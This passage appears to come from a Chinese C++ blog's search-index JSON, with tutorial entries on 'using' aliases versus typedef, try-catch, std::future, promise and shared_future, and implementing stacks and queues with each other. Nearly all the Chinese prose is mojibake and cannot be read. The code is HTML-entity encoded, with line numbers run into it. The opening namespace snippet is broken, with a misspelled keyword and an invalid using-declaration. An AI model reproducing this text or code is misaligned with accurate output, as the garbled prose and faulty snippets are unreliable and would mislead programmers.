å‘½åç©ºé—´çš„ç”¨æ³•ç›¸å¯¹ç®€å•å“ˆ 123456789101112131415using namespace std;using std::cout;//////////////////////////namepsapce nsmine &#123; void cout(); namespace minedefine &#123; #define MINE &quot;mine&quot; &#125;&#125;using namespace nsmine;using nsmine::minedefine; äºŒã€ä½¿ç”¨usingèµ·åˆ«å ç›¸å½“äº typedef 12typedef std::vector&lt;int&gt; intvec;using intvec = std::vector&lt;int&gt;; ä»¥ä¸Šä¸¤ç§å†™æ³•ç­‰ä»·ã€‚åŒæ ·ä¸¤ç§æ–¹å¼ä¹Ÿéƒ½é€‚ç”¨äºå‡½æ•°åˆ«åçš„å£°æ˜ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š 12// ä»£ç  2-2typedef void (*FP) (int, const std::string&amp;); ä»£ç  2-2 ä½¿ç”¨ typedef ä¸º void (int, const std::string&amp;) åˆ›å»ºäº†ä¸€ä¸ªåˆ«å FPã€‚åŒæ ·æˆ‘ä»¬ä½¿ç”¨usingæ¥åšè¿™ä¸ªæ“ä½œï¼Œå‡½æ•°è¿”å›ç±»å‹æ˜¯voidï¼Œæ¥æ”¶å‚æ•°ä¸ºint,const std::string&amp; 1using Fp = void (*) (int, const std::string&amp;); usingçš„å†™æ³•æŠŠåˆ«åçš„åå­—å¼ºåˆ¶åˆ†ç¦»åˆ°äº†å·¦è¾¹ï¼Œè€ŒæŠŠåˆ«åæŒ‡å‘çš„æ”¾åœ¨äº†å³è¾¹ï¼Œæ¯”è¾ƒæ¸…æ™°ï¼Œå¯è¯»æ€§æ¯”è¾ƒå¥½ã€‚æ¯”å¦‚ï¼š 123typedef std::string (Foo::* fooMemFnPtr) (const std::string&amp;); using fooMemFnPtr = std::string (Foo::*) (const std::string&amp;);","tags":[{"name":"CPP","slug":"CPP","permalink":"https://hodlyounger.github.io/tags/CPP/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘try-catchå—","date":"2023-10-27T01:24:02.106Z","path":"B_Code/CPP/ã€CPPã€‘try-catchå—/","text":"[toc] è¯´æ˜ Try å—ï¼š å°†ä¸€æˆ–å¤šä¸ªå¼‚å¸¸å¤„ç†å—ï¼ˆcatch å­å¥ï¼‰ä¸å¤åˆè¯­å¥å…³è”ã€‚ å£°æ˜ä¸€ä¸ªå…·åå½¢å‚çš„ catch å­å¥ 1try &#123; /* */ &#125; catch (const std::exception&amp; e) &#123; /* */ &#125; å£°æ˜ä¸€ä¸ªæ— åå½¢å‚çš„ catch å­å¥ 1try &#123; /* */ &#125; catch (const std::exception&amp;) &#123; /* */ &#125; catch-all å¤„ç†å—ï¼Œå¯è¢«ä»»ä½•å¼‚å¸¸æ¿€æ´» 1try &#123; /* */ &#125; catch (...) &#123; /* */ &#125;","tags":[{"name":"C++","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"},{"name":"å¼‚å¸¸","slug":"å¼‚å¸¸","permalink":"https://hodlyounger.github.io/tags/%E5%BC%82%E5%B8%B8/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"}]},{"title":"ã€CPPã€‘std::future","date":"2023-10-27T01:24:02.105Z","path":"B_Code/CPP/std/ã€CPPã€‘future/","text":"æ¦‚è¿°: std::future çš„ç”¨æ³•æ•´ç† [toc] ä»‹ç» 123#include &lt;future&gt;std::future &lt; T &gt; f std::futureæ˜¯C++11æ ‡å‡†åº“ï¼ˆå¹¶å‘æ”¯æŒåº“ï¼‰ä¸­çš„ä¸€ä¸ª[æ¨¡æ¿ç±»]ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªå¼‚æ­¥æ“ä½œçš„ç»“æœã€‚å½“æˆ‘ä»¬åœ¨å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­ä½¿ç”¨å¼‚æ­¥ä»»åŠ¡æ—¶ï¼Œstd::futureå¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨éœ€è¦çš„æ—¶å€™è·å–ä»»åŠ¡çš„æ‰§è¡Œç»“æœã€‚std::futureçš„ä¸€ä¸ªé‡è¦ç‰¹æ€§æ˜¯èƒ½å¤Ÿé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°å¼‚æ­¥æ“ä½œå®Œæˆï¼Œä»è€Œç¡®ä¿æˆ‘ä»¬åœ¨è·å–ç»“æœæ—¶ä¸ä¼šé‡åˆ°æœªå®Œæˆçš„æ“ä½œã€‚ æˆå‘˜å‡½æ•° æ„é€ å‡½æ•° future() noexcept: é»˜è®¤æ„é€ å‡½æ•°ã€‚æ„é€ æ— å…±äº«çŠ¶æ€çš„ std::future ã€‚æ„é€ åï¼Œ valid() == false future( future&amp;&amp; other ) noexcept:ç§»åŠ¨æ„é€ å‡½æ•°ã€‚ç”¨ç§»åŠ¨è¯­ä¹‰ï¼Œä»¥ other çš„å…±äº«çŠ¶æ€æ„é€  std::future ã€‚æ„é€ å other.valid() == false ã€‚ future( const future&amp; other ) = delete : ä¸å¯å¤åˆ¶æ„é€  (CopyConstructible) ã€‚ ææ„å‡½æ•° ~future(); operator= future&amp; operator=( future&amp;&amp; other ) noexcept:é‡Šæ”¾ä»»ä½•å…±äº«çŠ¶æ€å¹¶ç§»åŠ¨èµ‹å€¼ other çš„å†…å®¹ç»™ *this ã€‚èµ‹å€¼åï¼Œ other.valid() == false ä¸” this-&gt;valid() å°†äº§ç”Ÿä¸ other.valid() åœ¨èµ‹å€¼å‰ç›¸åŒçš„å€¼ã€‚ future&amp; operator=( const future&amp; other ) = delete: ä¸å¯å¤åˆ¶èµ‹å€¼ (CopyAssignable) ã€‚ share() noexcept: è½¬ç§» *this çš„å…±äº«çŠ¶æ€åˆ° std::shared_future å¯¹è±¡ã€‚å¤šä¸ª std::shared_future å¯¹è±¡å¯å¼•ç”¨åŒä¸€å…±äº«å¯¹è±¡ï¼Œè°ƒç”¨åvalid() == false ã€‚ T get(): get æ–¹æ³•ç­‰å¾…ç›´è‡³ future æ‹¥æœ‰åˆæ³•ç»“æœå¹¶ï¼ˆä¾èµ–äºä½¿ç”¨å“ªä¸ªæ¨¡æ¿ï¼‰è·å–å®ƒã€‚å®ƒç­‰æ•ˆåœ°è°ƒç”¨ wait() ç­‰å¾…ç»“æœã€‚æ³›å‹æ¨¡æ¿å’ŒäºŒä¸ªæ¨¡æ¿ç‰¹åŒ–å„å«å•ä¸ª get ç‰ˆæœ¬ã€‚ get çš„ä¸‰ä¸ªç‰ˆæœ¬ä»…åœ¨è¿”å›ç±»å‹æœ‰åˆ«ã€‚è‹¥è°ƒç”¨æ­¤å‡½æ•°å‰ valid() ä¸º false åˆ™è¡Œä¸ºæœªå®šä¹‰ã€‚é‡Šæ”¾ä»»ä½•å…±äº«çŠ¶æ€ã€‚è°ƒç”¨æ­¤æ–¹æ³•åvalid() ä¸º false ã€‚ bool valid(): æ£€æŸ¥futureæ˜¯å¦å¯ä»¥å…±äº«çŠ¶æ€ã€‚ wait(): ç­‰å¾…ç»“æœå˜å¾—å¯ç”¨ wait_for wait_until ä½œç”¨ å¼‚æ­¥æ“ä½œçš„ç»“æœè·å–ï¼šstd::futureæä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œå…è®¸æˆ‘ä»¬åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­å®‰å…¨åœ°è·å–å¼‚æ­¥æ“ä½œçš„ç»“æœã€‚ éšè—å¼‚æ­¥æ“ä½œçš„ç»†èŠ‚ï¼šstd::futureå°†å¼‚æ­¥æ“ä½œçš„ç»“æœå°è£…èµ·æ¥ï¼Œä½¿ç¨‹åºå‘˜æ— éœ€å…³æ³¨çº¿ç¨‹åŒæ­¥å’Œé€šä¿¡çš„å…·ä½“å®ç°ç»†èŠ‚ã€‚ çº¿ç¨‹åŒæ­¥ï¼šé€šè¿‡é˜»å¡ç­‰å¾…å¼‚æ­¥æ“ä½œå®Œæˆï¼Œstd::futureå¯ä»¥ç¡®ä¿æˆ‘ä»¬åœ¨ç»§ç»­æ‰§è¡Œå…¶ä»–æ“ä½œä¹‹å‰ï¼Œå·²ç»è·å–äº†æ‰€éœ€çš„ç»“æœã€‚ å¼‚å¸¸å¤„ç†ï¼šstd::futureå¯ä»¥æ•è·å¼‚æ­¥æ“ä½œä¸­æŠ›å‡ºçš„å¼‚å¸¸ï¼Œå¹¶åœ¨è·å–ç»“æœæ—¶é‡æ–°æŠ›å‡ºï¼Œä¹Ÿå¯ä»¥åœ¨ä¸»çº¿ç¨‹ä¸­å¯¹å…¶è¿›è¡Œå¤„ç†ï¼Œä»è€Œä½¿å¾—å¼‚å¸¸å¤„ç†æ›´åŠ ç®€å•ã€‚ æé«˜æ€§èƒ½ï¼šstd::futureä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿæ›´å¥½åœ°åˆ©ç”¨å¤šæ ¸å¤„ç†å™¨çš„æ€§èƒ½ï¼Œé€šè¿‡å¹¶è¡Œæ‰§è¡Œä»»åŠ¡æ¥æé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚ ä½¿ç”¨åœºæ™¯ å¼‚æ­¥ä»»åŠ¡ å½“æˆ‘ä»¬éœ€è¦åœ¨åå°æ‰§è¡Œä¸€äº›è€—æ—¶æ“ä½œæ—¶ï¼Œå¦‚[æ–‡ä»¶è¯»å†™]ã€ç½‘ç»œè¯·æ±‚æˆ–è®¡ç®—å¯†é›†å‹ä»»åŠ¡ï¼Œstd::futureå¯ä»¥ç”¨æ¥è¡¨ç¤ºè¿™äº›å¼‚æ­¥ä»»åŠ¡çš„ç»“æœã€‚é€šè¿‡å°†ä»»åŠ¡ä¸ä¸»çº¿ç¨‹åˆ†ç¦»ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ä»»åŠ¡çš„å¹¶è¡Œå¤„ç†ï¼Œä»è€Œæé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚ å¹¶å‘æ§åˆ¶ åœ¨[å¤šçº¿ç¨‹ç¼–ç¨‹]ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ç­‰å¾…æŸäº›ä»»åŠ¡å®Œæˆåæ‰èƒ½ç»§ç»­æ‰§è¡Œå…¶ä»–æ“ä½œã€‚é€šè¿‡ä½¿ç”¨std::futureï¼Œæˆ‘ä»¬å¯ä»¥å®ç°çº¿ç¨‹ä¹‹é—´çš„åŒæ­¥ï¼Œç¡®ä¿ä»»åŠ¡å®Œæˆåå†è·å–ç»“æœå¹¶ç»§ç»­æ‰§è¡Œåç»­æ“ä½œã€‚ ç»“æœè·å– std::futureæä¾›äº†ä¸€ç§å®‰å…¨çš„æ–¹å¼æ¥è·å–å¼‚æ­¥ä»»åŠ¡çš„ç»“æœã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨std::future::get()å‡½æ•°æ¥è·å–ä»»åŠ¡çš„ç»“æœã€‚æ­¤å‡½æ•°ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°å¼‚æ­¥æ“ä½œå®Œæˆã€‚è¿™æ ·ï¼Œåœ¨è°ƒç”¨get()å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿å·²ç»è·å–åˆ°äº†æ‰€éœ€çš„ç»“æœã€‚å¦‚æœå¼‚æ­¥æ“ä½œä¸­å‘ç”Ÿäº†å¼‚å¸¸ï¼Œget()å‡½æ•°ä¼šå°†å¼‚å¸¸é‡æ–°æŠ›å‡ºï¼Œä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿå¤„ç†è¿™äº›å¼‚å¸¸ã€‚ ç”¨æ³•ç¤ºä¾‹ ä½¿ç”¨std::asyncå…³è”å¼‚æ­¥ä»»åŠ¡ ä½¿ç”¨std::asyncå°†ä»»åŠ¡ä¸std::futureå…³è”ã€‚å®ƒåˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªä¸è¯¥ä»»åŠ¡ç»“æœå…³è”çš„std::futureå¯¹è±¡ã€‚ 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;future&gt;#include &lt;chrono&gt;int long_running_task() &#123; std::this_thread::sleep_for(std::chrono::seconds(3)); return 42;&#125;int main() &#123; // std::future&lt;int&gt; å£°æ˜çš„ç±»å‹ä¸ long_running_task è¿”å›å€¼ç±»å‹å¿…é¡»ä¸€è‡´ std::future&lt;int&gt; result_future = std::async(std::launch::async, long_running_task); // åœ¨æ­¤å¤„æ‰§è¡Œå…¶ä»–æ“ä½œ int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; ä½¿ç”¨std::promiseä¸std::futureé…åˆ std::promiseæ˜¯å¦ä¸€ç§ä¸std::futureé…åˆä½¿ç”¨çš„æ–¹å¼ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨std::promiseå¯¹è±¡æ¥æ˜¾å¼åœ°è®¾ç½®ä»»åŠ¡çš„ç»“æœï¼Œè€Œstd::futureå¯¹è±¡åˆ™ç”¨äºè·å–è¿™ä¸ªç»“æœã€‚ 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;future&gt;#include &lt;thread&gt;void long_running_task(std::promise&lt;int&gt; result_promise) &#123; // æ‰§è¡Œé•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡ int result = 42; // å°†ç»“æœè®¾ç½®åˆ°promiseå¯¹è±¡ä¸­ result_promise.set_value(result);&#125;int main() &#123; std::promise&lt;int&gt; result_promise; std::future&lt;int&gt; result_future = result_promise.get_future(); // åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹ï¼Œæ‰§è¡Œé•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡ std::thread task_thread(long_running_task, std::move(result_promise)); // åœ¨æ­¤å¤„æ‰§è¡Œå…¶ä»–æ“ä½œ int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; task_thread.join(); return 0;&#125; ç»“æœè·å–ä¸å¼‚å¸¸å¤„ç† ä½¿ç”¨std::future::get() å‡½æ•°å¯ä»¥è·å–å¼‚æ­¥ä»»åŠ¡çš„ç»“æœã€‚æ­¤å‡½æ•°ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°å¼‚æ­¥æ“ä½œå®Œæˆã€‚å¦‚æœå¼‚æ­¥æ“ä½œä¸­å‘ç”Ÿäº†å¼‚å¸¸ï¼Œget()å‡½æ•°ä¼šå°†å¼‚å¸¸é‡æ–°æŠ›å‡ºã€‚ âš ï¸ æ³¨æ„ï¼šstd::future::get()å‡½æ•°åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ã€‚åœ¨è°ƒç”¨get()ä¹‹åï¼Œstd::futureå¯¹è±¡å°†å˜ä¸ºæ— æ•ˆçŠ¶æ€ã€‚ ğŸš§ å¦‚æœéœ€è¦å¤šæ¬¡è®¿é—®ç»“æœï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨std::shared_futureã€‚ 123456789101112131415161718try &#123; int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; &quot;Exception caught: &quot; &lt;&lt; e.what() &lt;&lt; std::endl;&#125; catch (...) &#123; std::cerr &lt;&lt; &quot;Unknown exception caught&quot; &lt;&lt; std::endl;&#125;std::chrono::milliseconds timeout(100);std::future_status status = result_future.wait_for(timeout);if (status == std::future_status::ready) &#123; int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125; else &#123; std::cerr &lt;&lt; &quot;Timeout: the task is still running&quot; &lt;&lt; std::endl;&#125; æ³¨æ„äº‹é¡¹ åœ¨ä½¿ç”¨std::futureæ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š std::future::get()å‡½æ•°åªèƒ½è¢«è°ƒç”¨ä¸€æ¬¡ã€‚è°ƒç”¨get()ä¹‹åï¼Œstd::futureå¯¹è±¡å°†å˜ä¸ºæ— æ•ˆçŠ¶æ€ã€‚å¦‚æœéœ€è¦å¤šæ¬¡è®¿é—®ç»“æœï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨std::shared_futureã€‚ std::futureå¯¹è±¡ä¸å¯æ‹·è´ï¼Œä½†å¯ä»¥é€šè¿‡ç§»åŠ¨æ„é€ å‡½æ•°æˆ–ç§»åŠ¨èµ‹å€¼æ“ä½œç¬¦è¿›è¡Œè½¬ç§»ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½å°†std::futureå¯¹è±¡å­˜å‚¨åœ¨å®¹å™¨ä¸­ï¼Œé™¤éä½¿ç”¨std::shared_futureæˆ–æŒ‡é’ˆåŒ…è£…ã€‚ å½“ä½¿ç”¨std::asyncæ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œä»»åŠ¡å¯èƒ½ä¼šåœ¨å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚è¿™å–å†³äºåº“å®ç°å’Œç³»ç»Ÿèµ„æºã€‚è‹¥è¦ç¡®ä¿ä»»åŠ¡åœ¨æ–°çº¿ç¨‹ä¸­æ‰§è¡Œï¼Œå¯ä»¥ä½¿ç”¨std::launch::asyncæ ‡å¿—ï¼š std::future result_future = std::async(std::launch::async, long_running_task); å¦‚æœstd::futureå¯¹è±¡åœ¨ææ„æ—¶ä»å…³è”ç€ä¸€ä¸ªæœ‰æ•ˆçš„å¼‚æ­¥æ“ä½œï¼Œä¸”è¯¥æ“ä½œå°šæœªå®Œæˆï¼Œææ„å‡½æ•°ä¼šé˜»å¡ç­‰å¾…æ“ä½œå®Œæˆã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™å¯èƒ½å¯¼è‡´ç¨‹åºæ­»é”ã€‚ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥åœ¨ææ„std::futureå¯¹è±¡ä¹‹å‰æ˜¾å¼åœ°è°ƒç”¨wait()ã€wait_for()æˆ–wait_until()å‡½æ•°ã€‚ è™½ç„¶std::futureåœ¨è·å–å¼‚æ­¥ä»»åŠ¡ç»“æœå’Œçº¿ç¨‹åŒæ­¥æ–¹é¢éå¸¸æœ‰ç”¨ï¼Œä½†å®ƒå¹¶ä¸èƒ½è§£å†³æ‰€æœ‰å¹¶å‘é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œstd::futureæ— æ³•ç”¨äºå®ç°å¤æ‚çš„å¹¶å‘æ¨¡å¼ï¼Œå¦‚çº¿ç¨‹æ± ã€å·¥ä½œçªƒå–ç­‰ã€‚å¯¹äºè¿™äº›é«˜çº§å¹¶å‘éœ€æ±‚ï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨å…¶ä»–åº“æˆ–è€…è‡ªå®šä¹‰å®ç°ã€‚ ä½¿ç”¨std::promiseå’Œstd::futureæ—¶ï¼Œéœ€è¦ç¡®ä¿åœ¨è°ƒç”¨get()ä¹‹å‰å·²ç»è®¾ç½®äº†å¯¹åº”çš„å€¼ï¼Œå¦åˆ™ä¼šå¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºã€‚è¿™å¯èƒ½éœ€è¦å¯¹ä»£ç è¿›è¡Œä»”ç»†çš„è®¾è®¡å’Œè°ƒè¯•ï¼Œä»¥ç¡®ä¿æ­£ç¡®çš„æ‰§è¡Œé¡ºåºã€‚ std::futureå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸéœ€è¦ä»”ç»†ç®¡ç†ã€‚å¦‚æœstd::futureå¯¹è±¡è¢«æå‰é”€æ¯ï¼Œé‚£ä¹ˆå…³è”çš„å¼‚æ­¥ä»»åŠ¡å¯èƒ½ä¼šå˜å¾—ä¸å¯è®¿é—®ã€‚å› æ­¤ï¼Œéœ€è¦ç¡®ä¿åœ¨å¼‚æ­¥ä»»åŠ¡å®Œæˆä¹‹å‰ä¿æŒstd::futureå¯¹è±¡çš„æœ‰æ•ˆæ€§ã€‚ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä½¿ç”¨std::futureå¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚ä¾‹å¦‚ï¼Œå½“å¤šä¸ªçº¿ç¨‹é¢‘ç¹åœ°ç­‰å¾…å¼‚æ­¥æ“ä½œç»“æœæ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´çº¿ç¨‹é˜»å¡å’Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ã€‚ä¸ºäº†é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨éé˜»å¡çš„æ–¹å¼æŸ¥è¯¢å¼‚æ­¥æ“ä½œçŠ¶æ€ï¼Œå¦‚std::future::wait_for()å’Œstd::future::wait_until()å‡½æ•°ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¼‚æ­¥æ“ä½œæœªå®Œæˆæ—¶æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œæé«˜ç¨‹åºçš„å“åº”æ€§å’Œå¹¶å‘æ€§èƒ½ã€‚ std::futureå¹¶ä¸é€‚ç”¨äºæ‰€æœ‰åœºæ™¯ã€‚ä¾‹å¦‚ï¼Œå®ƒä¸é€‚ç”¨äºéœ€è¦å¤„ç†å¤šä¸ªè¾“å…¥æˆ–è¾“å‡ºç»“æœçš„ä»»åŠ¡ï¼Œæˆ–è€…éœ€è¦å®ç°åŠ¨æ€ä»»åŠ¡ä¾èµ–å…³ç³»çš„åœºæ™¯ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œå¯èƒ½éœ€è¦å¯»æ‰¾å…¶ä»–å¹¶å‘å’ŒåŒæ­¥è§£å†³æ–¹æ¡ˆã€‚ è™½ç„¶std::futureæä¾›äº†å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸€æ—¦std::future::get()å‡½æ•°é‡æ–°æŠ›å‡ºå¼‚å¸¸ï¼Œè¯¥å¼‚å¸¸éœ€è¦åœ¨è°ƒç”¨get()çš„çº¿ç¨‹ä¸­è¿›è¡Œæ•è·å’Œå¤„ç†ã€‚è¿™æ„å‘³ç€éœ€è¦åœ¨ä¸»çº¿ç¨‹å’Œå…¶ä»–çº¿ç¨‹ä¸­è®¾ç½®é€‚å½“çš„å¼‚å¸¸å¤„ç†ç­–ç•¥ï¼Œä»¥ç¡®ä¿ç¨‹åºçš„ç¨³å®šæ€§å’Œå¥å£®æ€§ã€‚ å…¶ä»– std::shared_future std::shared_futureæ˜¯std::futureçš„ä¸€ä¸ªå˜ä½“ï¼Œå…è®¸å¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ä¸ªå¼‚æ­¥æ“ä½œçš„ç»“æœã€‚ä¸std::futureä¸åŒï¼Œstd::shared_futureå¯¹è±¡å¯ä»¥è¢«æ‹·è´ï¼Œå› æ­¤å¯ä»¥å°†å…¶å­˜å‚¨åœ¨å®¹å™¨ä¸­æˆ–åœ¨å¤šä¸ªçº¿ç¨‹ä¹‹é—´ä¼ é€’ã€‚æ­¤å¤–ï¼Œstd::shared_future::get()å‡½æ•°å¯ä»¥è¢«å¤šæ¬¡è°ƒç”¨ï¼Œè€Œä¸ä¼šä½¿std::shared_futureå¯¹è±¡å˜ä¸ºæ— æ•ˆçŠ¶æ€ã€‚ 1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;future&gt;#include &lt;thread&gt;void print_result(std::shared_future&lt;int&gt; result_future) &#123; int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125;int main() &#123; std::promise&lt;int&gt; result_promise; std::shared_future&lt;int&gt; result_future = result_promise.get_future().share(); std::thread t1(print_result, result_future); std::thread t2(print_result, result_future); result_promise.set_value(42); t1.join(); t2.join(); return 0;&#125; std::future_status std::future_statusæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œè¡¨ç¤ºå¼‚æ­¥æ“ä½œçš„çŠ¶æ€ã€‚å®ƒæœ‰ä¸‰ä¸ªå¯èƒ½çš„å€¼ï¼š std::future_status::readyï¼šå¼‚æ­¥æ“ä½œå·²å®Œæˆï¼Œç»“æœå¯ç”¨ã€‚ std::future_status::timeoutï¼šå¼‚æ­¥æ“ä½œå°šæœªå®Œæˆï¼Œç­‰å¾…å·²è¶…æ—¶ã€‚ std::future_status::deferredï¼šå¼‚æ­¥æ“ä½œå·²è¢«å»¶è¿Ÿï¼Œå°šæœªå¯åŠ¨ï¼ˆä»…å½“ä½¿ç”¨std::launch::deferredç­–ç•¥åˆ›å»ºstd::futureå¯¹è±¡æ—¶æ‰å¯èƒ½å‡ºç°ï¼‰ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨std::future::wait_for()å’Œstd::future::wait_until()å‡½æ•°æŸ¥è¯¢å¼‚æ­¥æ“ä½œçš„çŠ¶æ€ï¼Œè€Œæ— éœ€é˜»å¡å½“å‰çº¿ç¨‹ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;future&gt;#include &lt;chrono&gt;int long_running_task() &#123; std::this_thread::sleep_for(std::chrono::seconds(3)); return 42;&#125;int main() &#123; std::future&lt;int&gt; result_future = std::async(std::launch::async, long_running_task); std::chrono::milliseconds timeout(1000); std::future_status status = result_future.wait_for(timeout); if (status == std::future_status::ready) &#123; int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Timeout: the task is still running&quot; &lt;&lt; std::endl; &#125; // ç­‰å¾…ä»»åŠ¡å®Œæˆï¼Œä»¥ä¾¿æ­£ç¡®è·å–ç»“æœ int result = result_future.get(); std::cout &lt;&lt; &quot;Final result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†std::future::wait_for()å‡½æ•°æ¥æŸ¥è¯¢å¼‚æ­¥æ“ä½œçš„çŠ¶æ€ã€‚å¦‚æœçŠ¶æ€ä¸ºstd::future_status::readyï¼Œæˆ‘ä»¬å¯ä»¥ç«‹å³è·å–ç»“æœã€‚å¦åˆ™ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç­‰å¾…æœŸé—´æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œä»¥æé«˜ç¨‹åºçš„å“åº”æ€§å’Œå¹¶å‘æ€§èƒ½ã€‚æœ€åï¼Œåœ¨é€€å‡ºmainå‡½æ•°ä¹‹å‰ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨result_future.get()ä»¥ç¡®ä¿æ­£ç¡®è·å–å¼‚æ­¥æ“ä½œçš„ç»“æœã€‚","tags":[{"name":"CPP/future","slug":"CPP-future","permalink":"https://hodlyounger.github.io/tags/CPP-future/"},{"name":"CPP/std","slug":"CPP-std","permalink":"https://hodlyounger.github.io/tags/CPP-std/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/"},{"name":"std","slug":"B-Code/CPP/std","permalink":"https://hodlyounger.github.io/categories/B-Code/CPP/std/"}]},{"title":"é˜Ÿåˆ—å’Œæ ˆçš„äº’ç›¸å®ç°","date":"2023-10-27T01:24:02.103Z","path":"B_Code/CPP/STL/ã€STLã€‘é˜Ÿåˆ—å’Œæ ˆçš„äº’ç›¸å®ç°/","text":"æ¦‚è¿°ï¼š1. ç”¨é˜Ÿåˆ—å®ç°æ ˆï¼›2. ç”¨æ ˆå®ç°é˜Ÿåˆ— é˜Ÿåˆ—: å…ˆè¿›å…ˆå‡º æ ˆï¼šå…ˆè¿›åå‡º é˜Ÿåˆ—å®ç°æ ˆ æ€è·¯ å®ç° 12345678910111213141516171819202122232425262728293031323334class MyStack &#123;public: void Push(int val) &#123; if(queueSta.empty()) &#123; queueSta.push(val); &#125; else &#123; int cnt = queueSta.size(); queueSta.push(val); while(cnt-- &gt; 0) &#123; queueSta.push(queueSta.front()); queueSta.pop(); &#125; &#125; &#125; int Pop() &#123; int res = queueSta.front(); queueSta.pop(); return res; &#125; bool Empty() &#123;return queueSta.empty();&#125;; private: queue&lt;int&gt; queueSta;&#125;; æ ˆå®ç°é˜Ÿåˆ— æ€è·¯ å®ç° 1234567891011121314151617181920212223242526class MyQueue &#123;public: void Push(int val) &#123; sta1.push(val); &#125; int Pop() &#123; if(sta2.empty()) &#123; while(!sta1.empty()) &#123; sta2.push(sta1.top()); sta1.pop(); &#125; &#125; int res = sta2.top(); sta2.pop(); return res; &#125; private: stack&lt;int&gt; 